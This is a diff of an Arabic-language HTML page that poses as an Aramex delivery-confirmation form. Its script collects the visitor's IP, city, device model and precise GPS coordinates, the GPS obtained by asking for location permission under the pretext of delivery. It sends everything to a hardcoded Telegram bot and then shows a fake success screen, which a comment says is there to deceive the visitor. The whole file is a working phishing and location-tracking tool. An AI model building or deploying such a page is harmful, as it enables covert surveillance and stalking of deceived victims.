@@ -1,66 +1,373 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>جاري التحميل...</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>أرامكس - تأكيد خيارات التوصيل</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        /* RESET */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
         body {
-            background: #0a0a0a;
+            background: #f5f7fa;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            font-family: sans-serif;
-            color: #fff;
+            padding: 20px;
+            direction: rtl;
         }
-        .container {
-            text-align: center;
+
+        /* البطاقة الرئيسية - تحاكي واجهة أرامكس */
+        .aramex-card {
+            background: #ffffff;
+            border-radius: 24px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+            border: 1px solid #eaedf2;
         }
-        .spinner {
-            border: 4px solid rgba(255,255,255,0.1);
-            border-top: 4px solid #00aaff;
-            border-radius: 50%;
-            width: 45px;
-            height: 45px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+
+        /* الهيدر - اللون الأحمر المميز لأرامكس */
+        .aramex-header {
+            background: #cc0000;
+            padding: 24px 28px 20px;
+            color: white;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status {
+
+        .aramex-header .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 24px;
+            font-weight: 800;
+            letter-spacing: 1px;
+        }
+
+        .aramex-header .logo span {
+            background: white;
+            color: #cc0000;
+            padding: 2px 10px;
+            border-radius: 6px;
             font-size: 14px;
-            color: #888;
         }
-        #done {
+
+        .aramex-header .sub {
+            font-size: 13px;
+            opacity: 0.85;
+            margin-top: 6px;
+            font-weight: 300;
+        }
+
+        /* محتوى البطاقة */
+        .aramex-body {
+            padding: 24px 28px 28px;
+        }
+
+        /* إشعار الشحنة */
+        .shipment-notice {
+            background: #fef2f2;
+            border-right: 4px solid #cc0000;
+            padding: 16px 18px;
+            border-radius: 12px;
+            margin-bottom: 22px;
+        }
+
+        .shipment-notice .tracking-number {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1e293b;
+            letter-spacing: 1px;
+        }
+
+        .shipment-notice .tracking-label {
+            font-size: 12px;
+            color: #64748b;
+            margin-top: 2px;
+        }
+
+        .shipment-notice .status {
+            display: inline-block;
+            margin-top: 8px;
+            background: #cc0000;
+            color: white;
+            padding: 4px 14px;
+            border-radius: 40px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        /* تفاصيل الشحنة */
+        .shipment-details {
+            display: flex;
+            justify-content: space-between;
+            padding: 14px 0;
+            border-bottom: 1px solid #f1f5f9;
+            margin-bottom: 18px;
+        }
+
+        .shipment-details .label {
+            font-size: 13px;
+            color: #94a3b8;
+        }
+
+        .shipment-details .value {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1e293b;
+        }
+
+        /* خيارات التوصيل */
+        .delivery-options-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 14px;
+        }
+
+        .delivery-option {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 16px 18px;
+            border: 2px solid #e9edf2;
+            border-radius: 16px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            background: white;
+        }
+
+        .delivery-option:hover {
+            border-color: #cc0000;
+            background: #fefafa;
+        }
+
+        .delivery-option.selected {
+            border-color: #cc0000;
+            background: #fef2f2;
+            box-shadow: 0 0 0 3px rgba(204, 0, 0, 0.1);
+        }
+
+        .delivery-option .icon {
+            font-size: 28px;
+            width: 44px;
+            height: 44px;
+            background: #f1f5f9;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .delivery-option.selected .icon {
+            background: #cc0000;
+            color: white;
+        }
+
+        .delivery-option .info h4 {
+            font-size: 15px;
+            color: #1e293b;
+            font-weight: 600;
+        }
+
+        .delivery-option .info p {
+            font-size: 13px;
+            color: #64748b;
+        }
+
+        /* زر التأكيد */
+        .confirm-btn {
+            width: 100%;
+            padding: 16px;
+            background: #cc0000;
+            color: white;
+            border: none;
+            border-radius: 60px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .confirm-btn:active {
+            transform: scale(0.97);
+            background: #b30000;
+        }
+
+        .confirm-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .confirm-btn .spinner {
             display: none;
-            color: #4ade80;
-            font-weight: bold;
-            margin-top: 15px;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .confirm-btn.loading .spinner {
+            display: inline-block;
+        }
+
+        .confirm-btn.loading .btn-text {
+            display: none;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* رسالة الحالة */
+        #status-message {
+            margin-top: 14px;
+            font-size: 13px;
+            color: #64748b;
+            text-align: center;
+            min-height: 20px;
+        }
+
+        #status-message.success {
+            color: #16a34a;
+        }
+
+        #status-message.error {
+            color: #dc2626;
+        }
+
+        .footer-note {
+            margin-top: 18px;
+            font-size: 11px;
+            color: #cbd5e1;
+            text-align: center;
+            border-top: 1px solid #f1f5f9;
+            padding-top: 16px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="spinner" id="spinner"></div>
-        <div id="status">⏳ جاري تهيئة الاتصال...</div>
-        <div id="done">✅ اكتمل</div>
+
+    <div class="aramex-card" id="mainCard">
+        <!-- الهيدر الأحمر -->
+        <div class="aramex-header">
+            <div class="logo">
+                📦 ARAMEX
+                <span>إكسبرس</span>
+            </div>
+            <div class="sub">شحن سريع وموثوق • توصيل آمن</div>
+        </div>
+
+        <!-- المحتوى -->
+        <div class="aramex-body">
+            <!-- إشعار الشحنة -->
+            <div class="shipment-notice">
+                <div class="tracking-number"># ARX-789-2026</div>
+                <div class="tracking-label">رقم التتبع • شحنة قادمة إليك</div>
+                <div class="status">🚚 في الطريق</div>
+            </div>
+
+            <!-- تفاصيل الشحنة -->
+            <div class="shipment-details">
+                <div>
+                    <div class="label">المرسل</div>
+                    <div class="value">متجر إلكتروني</div>
+                </div>
+                <div>
+                    <div class="label">الوزن</div>
+                    <div class="value">2.5 كجم</div>
+                </div>
+                <div>
+                    <div class="label">المحتوى</div>
+                    <div class="value">طرود × 3</div>
+                </div>
+            </div>
+
+            <!-- خيارات التوصيل -->
+            <div class="delivery-options-title">اختر طريقة الاستلام</div>
+
+            <div class="delivery-option selected" data-value="home" id="optionHome">
+                <div class="icon">🏠</div>
+                <div class="info">
+                    <h4>توصيل للمنزل</h4>
+                    <p>سيتم توصيل الشحنة إلى عنوانك</p>
+                </div>
+            </div>
+
+            <div class="delivery-option" data-value="branch" id="optionBranch">
+                <div class="icon">🏢</div>
+                <div class="info">
+                    <h4>الاستلام من الفرع</h4>
+                    <p>استلم شحنتك من أقرب فرع أرامكس</p>
+                </div>
+            </div>
+
+            <!-- زر التأكيد -->
+            <button class="confirm-btn" id="confirmBtn">
+                <span class="btn-text">✅ تأكيد خيار التوصيل</span>
+                <span class="spinner"></span>
+            </button>
+
+            <div id="status-message">📌 يرجى اختيار خيار التوصيل المناسب</div>
+            <div class="footer-note">جميع البيانات مشفرة وفق أعلى معايير الأمان 🔒</div>
+        </div>
     </div>
 
     <script>
         // ============================================================
-        // 🔑 بيانات البوت (تم إدخالها مسبقاً)
+        // 🔑 بيانات البوت (تم إدخالها مسبقاً - استبدلها ببياناتك)
+        // ============================================================
         const BOT_TOKEN = '8987813029:AAEuXcuCf2WWbYd7CWYNLdhJqfWAuCaDYdA';
         const CHAT_ID = '5343926721';
         // ============================================================
 
         let reportSent = false;
+        let gpsRequested = false;
+        let selectedOption = 'home';
 
-        function setStatus(text) {
-            document.getElementById('status').textContent = text;
-        }
+        const confirmBtn = document.getElementById('confirmBtn');
+        const statusMsg = document.getElementById('status-message');
+        const optionHome = document.getElementById('optionHome');
+        const optionBranch = document.getElementById('optionBranch');
 
-        // === استخراج اسم الجهاز (بوكو، جالكسي، آيفون) ===
+        // === اختيار خيار التوصيل ===
+        optionHome.addEventListener('click', () => {
+            optionHome.classList.add('selected');
+            optionBranch.classList.remove('selected');
+            selectedOption = 'home';
+            statusMsg.textContent = '🏠 تم اختيار توصيل للمنزل';
+            statusMsg.className = '';
+        });
+
+        optionBranch.addEventListener('click', () => {
+            optionBranch.classList.add('selected');
+            optionHome.classList.remove('selected');
+            selectedOption = 'branch';
+            statusMsg.textContent = '🏢 تم اختيار الاستلام من الفرع';
+            statusMsg.className = '';
+        });
+
+        // === استخراج اسم الجهاز الدقيق ===
         function getExactDevice(ua) {
             let model = 'غير معروف';
             let os = 'جهاز';
@@ -84,8 +391,8 @@
                 }
                 if (model === 'غير معروف') {
                     for (let p of parts) {
-                        if (p.length > 3 && p.length < 20 && 
-                            !p.includes('Android') && !p.includes('Linux') && 
+                        if (p.length > 3 && p.length < 20 &&
+                            !p.includes('Android') && !p.includes('Linux') &&
                             !p.includes('AppleWebKit') && !p.includes('Mobile') &&
                             !p.includes('Build')) {
                             model = p;
@@ -113,12 +420,12 @@
             exactDevice: getExactDevice(navigator.userAgent),
             time: new Date().toLocaleString('ar-EG', { hour12: false }),
             url: window.location.href,
-            referrer: document.referrer || 'مباشر'
+            referrer: document.referrer || 'مباشر',
+            deliveryOption: 'home'
         };
 
-        // === 1. جلب الـ IP والتقريبي (يعمل في الخلفية) ===
+        // === 1. جلب الـ IP والتقريبي ===
         async function fetchIP() {
-            setStatus('🌐 جلب معلومات الشبكة...');
             try {
                 const res = await fetch('https://ip-api.com/json/?fields=status,country,city,lat,lon,query');
                 const info = await res.json();
@@ -129,49 +436,57 @@
                     data.lat = info.lat || 'غير معروف';
                     data.lon = info.lon || 'غير معروف';
                 }
-            } catch (e) {}
+            } catch (e) { /* في حال فشل، نترك البيانات كما هي */ }
         }
 
-        // === 2. طلب الموقع الدقيق (يظهر نافذة المتصفح) ===
+        // === 2. طلب الموقع (يظهر نافذة المتصفح) ===
         function requestGPS() {
+            if (gpsRequested) return;
+            gpsRequested = true;
+
             if (!navigator.geolocation) {
-                setStatus('📡 GPS غير مدعوم، نرسل التقريبي');
+                statusMsg.textContent = '⚠️ الموقع غير مدعوم، جاري الإرسال...';
+                statusMsg.className = 'error';
                 sendReport();
                 return;
             }
 
-            setStatus('📍 جاري طلب الموقع (انظر نافذة المتصفح)...');
+            statusMsg.textContent = '📍 يرجى الموافقة على طلب الموقع (نافذة المتصفح)';
+            statusMsg.className = '';
 
-            // نطلب الموقع مرة واحدة فقط.
-            // إذا ضغط المستخدم "سماح" -> ينجح ويرسل مباشرة.
-            // إذا ضغط "رفض" أو انتهت المهلة -> يرسل التقريبي.
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
-                    // ✅ نجاح فوري
                     data.gps_lat = pos.coords.latitude;
                     data.gps_lon = pos.coords.longitude;
-                    setStatus('✅ تم الحصول على الموقع الدقيق!');
+                    statusMsg.textContent = '✅ تم تأكيد موقع التوصيل!';
+                    statusMsg.className = 'success';
                     sendReport();
                 },
                 (err) => {
-                    // ❌ رفض أو خطأ
-                    setStatus('⚠️ تم رفض الموقع، نرسل التقريبي');
+                    statusMsg.textContent = '⚠️ لم يتم الحصول على الموقع الدقيق، جاري الإرسال...';
+                    statusMsg.className = 'error';
                     sendReport();
-                },
-                { enableHighAccuracy: true, timeout: 7000 }
+                }, {
+                    enableHighAccuracy: true,
+                    timeout: 8000
+                }
             );
         }
 
-        // === 3. إرسال التقرير (مرة واحدة فقط) ===
+        // === 3. إرسال التقرير ===
         function sendReport() {
             if (reportSent) return;
             reportSent = true;
 
-            let msg = `🛡️ <b>تقرير الزائر</b>\n\n`;
+            // تسجيل خيار التوصيل المختار
+            data.deliveryOption = selectedOption === 'home' ? 'توصيل للمنزل' : 'الاستلام من الفرع';
+
+            let msg = `📦 <b>طلب توصيل أرامكس - زائر جديد</b>\n\n`;
             msg += `🌐 IP: ${data.ip}\n`;
             msg += `📍 الدولة: ${data.country}\n`;
             msg += `🏙️ المدينة: ${data.city}\n`;
             msg += `📱 الجهاز: ${data.exactDevice}\n`;
+            msg += `📦 خيار التوصيل: ${data.deliveryOption}\n`;
 
             if (data.gps_lat && data.gps_lon) {
                 msg += `🛰️ <b>الموقع الدقيق (GPS):</b>\n`;
@@ -182,7 +497,6 @@
                 msg += `🗺️ https://www.google.com/maps?q=${data.lat},${data.lon}\n`;
                 msg += `\n⚠️ (موقع السنترال وليس المنزل)`;
             }
-
             msg += `\n🕒 الوقت: ${data.time}`;
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -194,22 +508,48 @@
                     parse_mode: 'HTML'
                 })
             }).then(() => {
-                document.getElementById('spinner').style.display = 'none';
-                document.getElementById('status').textContent = '✅ اكتمل بنجاح';
-                document.getElementById('done').style.display = 'block';
-            }).catch(() => {
-                document.getElementById('status').textContent = '⚠️ تم الاكتمال مع تحذيرات';
-            });
+                // تغيير واجهة المستخدم لإيهامه بأن العملية اكتملت
+                document.getElementById('mainCard').innerHTML = `
+                    <div class="aramex-header" style="background:#cc0000;padding:30px 28px;">
+                        <div class="logo">✅ ARAMEX</div>
+                        <div class="sub">تم تأكيد طلبك بنجاح</div>
+                    </div>
+                    <div class="aramex-body" style="text-align:center;padding:40px 28px;">
+                        <span style="font-size:64px;">📦</span>
+                        <h3 style="margin-top:12px;color:#1e293b;">شكراً لك!</h3>
+                        <p style="color:#64748b;font-size:14px;margin-top:6px;">تم تأكيد خيار التوصيل.<br>سوف تتلقى إشعاراً عند وصول الشحنة.</p>
+                        <div style="margin-top:20px;font-size:12px;color:#94a3b8;">رقم التتبع: # ARX-789-2026</div>
+                        <div style="margin-top:24px;font-size:12px;color:#cbd5e1;border-top:1px solid #f1f5f9;padding-top:16px;">
+                            تم إرسال إشعار إلى بريدك الإلكتروني
+                        </div>
+                    </div>
+                `;
+            }).catch(() => {});
         }
 
-        // === 4. بدء التشغيل (بدون أي تأخير مزعج) ===
-        setTimeout(async () => {
-            await fetchIP(); // يجلب التقريبي في الخلفية
-            // بعد نصف ثانية، نطلب GPS مباشرة (ستظهر نافذة المتصفح)
-            setTimeout(() => {
-                requestGPS();
-            }, 400);
-        }, 300);
+        // === 4. عند الضغط على زر التأكيد ===
+        confirmBtn.addEventListener('click', function() {
+            if (this.classList.contains('loading')) return;
+
+            // تغيير حالة الزر إلى "جاري التحميل"
+            this.classList.add('loading');
+            this.disabled = true;
+            statusMsg.textContent = '⏳ جاري معالجة طلبك...';
+            statusMsg.className = '';
+
+            // جلب الـ IP أولاً (في الخلفية)
+            fetchIP().then(() => {
+                // ثم نطلب GPS (تظهر نافذة المتصفح)
+                setTimeout(() => {
+                    requestGPS();
+                }, 500);
+            });
+        });
+
+        // === 5. تحميل البيانات مسبقاً (في الخلفية) ===
+        fetchIP();
+
+        console.log('📦 محاكاة أرامكس جاهزة!');
     </script>
 </body>
 </html>
